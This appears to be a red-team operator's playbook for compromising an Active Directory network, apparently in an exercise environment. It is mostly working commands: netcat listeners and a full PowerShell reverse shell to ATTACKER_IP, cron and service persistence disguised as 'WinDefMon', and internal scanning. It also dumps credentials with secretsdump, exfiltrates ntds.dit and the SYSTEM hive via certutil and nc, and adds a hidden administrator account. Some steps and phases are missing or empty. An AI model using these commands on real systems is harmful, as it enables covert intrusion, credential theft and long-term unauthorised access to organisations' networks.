

## 🧨 Final Red Team Implant: `pan_os_comm.sh` with Stealthy Service

### 1. 🎯 Start the Listener on (ATTACKER)

```bash
nc -lvnp 63842
```

### 2. 📁 Create the Reverse Shell Script (ATTACKER)

```bash
sudo vim /tmp/pan_os_comm.py
```

```bash
cd /tmp
wget http://10.10.100.169/pan_os_comm.py
```
### 4. Change perms of python file (VICTIM)
Make it executable:
```bash
chmod +x /tmp/pan_os_comm.py
```
### 5. Add Crontab every minute (VICTIM)

```bash
(crontab -l 2>/dev/null; echo '* * * * * /bin/systemctl start pan_os_comm.service >/dev/null 2>&1') | crontab -
```
---
# Attempt to pivot through firewall if routing/NAT is enabled
- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
network.


---










# Phase 3: Target Discovery Inside Orange Space
Assuming pivot success to internal hosts:
#### Scan internal subnets for DC or LDAP
```bash
nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
```

- Look for the Domain Controller (likely in orange-servers or orange-users).





---



# Phase 4: Credential Access (via LDAP, SAM/NTDS)
- Once a DC is identified (e.g., 172.20.2.X), you can:
	- 88, 389
- Enumerate via LDAP (LOLBAS):
```bash
ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
```
If admin rights are obtained, dump credentials:
1. Use secretsdump from Impacket
```bash
impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
```
2. If on host with NTDS.dit access:
	Copy ntds.dit and SYSTEM hive for offline cracking
```bash
copy C:\Windows\NTDS\ntds.dit D:\stolen\
reg save hklm\system D:\stolen\system.hiv
```
Transfer those over SMB/certutil:
```bash
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
nc.exe <attacker_ip> 4444 < ntds.dit
nc.exe <attacker_ip> 4445 < system.hiv
```
Then parse locally:
```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```


---


# Phase 5: Lateral Movement and Persistence
Use Admin Shares:
```bash
wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
psexec.py orange.local/adminuser@172.20.0.X
```
### Create a hidden user (LOLBAS):
```bash
net user stealthyUser P@ssw0rd! /add
net localgroup administrators stealthyUser /add
```
## Persist via Scheduled Task or Service:

```bash
schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
```
## 🔧 Step-by-Step: Install `WinDefMon` Reverse Shell Service on DC

### 1. 📜 **Reverse Shell Payload**

Save this script as `C:\ProgramData\winmon.ps1` on the **Domain Controller**:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",9999)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---
### 2. 🔐 **Base64 Encode It**

```powershell
$payload = Get-Content -Raw C:\ProgramData\winmon.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
```

---
### 3. ⚙️ **Create the Service as WinDefMon**

```powershell
$cmd = "powershell.exe -NoP -W Hidden -Enc $encoded"
sc.exe create WinDefMon binPath= "$cmd" start= auto
sc.exe start WinDefMon
```

💡 *Use quotes properly after `binPath=` and ensure the encoded string doesn't break on multiple lines if scripting.*

---
### 4. 🧪 **Start Your Listener**

```bash
nc -lvnp 9999
```
---

Or use registry run keys:

```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t 

REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
```

Phase 6: OT Network Target Prep (Later Stage)







# Teardown
## 🧼 Teardown (DC)

```powershell
sc stop WinDefMon
sc delete WinDefMon
Remove-Item C:\ProgramData\winmon.ps1 -Force
```
